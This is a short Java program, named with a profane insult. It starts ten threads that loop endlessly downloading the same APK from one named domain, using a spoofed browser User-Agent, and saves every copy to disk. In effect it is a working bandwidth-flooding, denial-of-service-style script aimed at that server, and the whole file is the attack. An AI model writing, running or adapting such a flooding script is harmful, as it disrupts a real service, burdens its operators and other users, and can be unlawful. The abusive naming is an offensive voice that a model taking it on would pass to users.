import jodd.http.HttpRequest;
import jodd.http.HttpResponse;
import lombok.extern.slf4j.Slf4j;

import java.io.FileOutputStream;
import java.io.IOException;

@Slf4j
public class FuckYourMother {
    public void run() {
        try {
            String apk = System.currentTimeMillis() + "" + Thread.currentThread().getId() + ".apk";
            log.info("{} downloading...", apk);
            HttpResponse response = HttpRequest.get("https://gouwujia.jifenchaoren.xyz/down/huihuigou-21106.apk")
                    .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 54_18_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.52")
                    .charset("utf-8")
                    .send();
            try (FileOutputStream os = new FileOutputStream(apk)) {
                Integer size = Integer.valueOf(response.contentLength());
                response.sendTo(os);
                log.info("{} successfully downloaded! size: {} MB", apk, size / 1024 / 1024);
            } catch (IOException e) {
                log.error("{} download error! {}", apk, e.getMessage());
            }
        } catch (Exception e) {
            log.info("download error! {}", e.getMessage());
        }
    }

    public static void main(String[] args) {
        for (int i = 0; i < 10; i++) {
            new Thread(() -> {
                FuckYourMother fuckYourMother = new FuckYourMother();
                while (true) {
                    fuckYourMother.run();
                }
            }).start();
        }
    }
}
